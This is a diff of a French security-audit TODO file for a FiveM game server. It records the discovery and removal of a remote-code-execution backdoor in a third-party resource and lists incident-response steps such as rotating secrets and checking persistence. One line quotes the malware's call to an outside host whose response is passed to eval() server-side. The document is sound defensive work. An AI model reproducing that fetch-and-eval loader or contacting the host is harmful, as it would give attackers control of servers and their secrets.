@@ -1,5 +1,22 @@
 # TODO — Audit serveur PVP (généré 2026-06-03)
 
+---
+
+## 🚨 INCIDENT SÉCURITÉ — BACKDOOR RCE (2026-06-03)
+
+- [x] **thug-killfeeds/html/server.js** — backdoor RCE actif : `require('http').get('http://uabjuza.lt:3000/api/connector/execute/js/SC_...')` → `eval()` de code distant arbitraire, chargé **côté serveur** via `fxmanifest.lua` (`server_scripts{ 'html/*.js' }`). Pas dans `escrow_ignore` = injecté furtivement. Famille de malware loader FiveM connue.
+  → ✅ Fichier supprimé (`git rm`) + `'html/*.js'` retiré des server_scripts. **Branche `fix/critical-security`.**
+
+### ⚠️ ACTIONS IR À FAIRE (décisions utilisateur)
+- [ ] **Considérer le serveur comme compromis** depuis l'installation de thug-killfeeds. Le backdoor a pu exécuter n'importe quel code (vol DB, comptes admin, persistance).
+- [ ] **Roter tous les secrets** : tokens Discord/webhooks, clés API, mots de passe DB (`server.cfg`), licence serveur, identifiants steam/admin.
+- [ ] **Auditer les autres ressources non-officielles** d'origine douteuse (même source que thug-killfeeds ?).
+- [ ] **Vérifier la persistance** : tâches cron/services inattendus, fichiers modifiés récemment, comptes admin DB ajoutés, ressources auto-ajoutées à `server.cfg`.
+- [ ] **Décider du sort de thug-killfeeds** : remplacer par une source propre/officielle plutôt que garder un resource trojané (même nettoyé). Webhook hijack `initUrl`/`triggerNotify` toujours présent (voir HIGH).
+
+---
+# Reste de l'audit
+
 Audit de ~28k lignes de code custom via 4 agents parallèles. Trié par priorité.
 Cocher `[x]` quand fait. Format : `resource/fichier:ligne`.
 
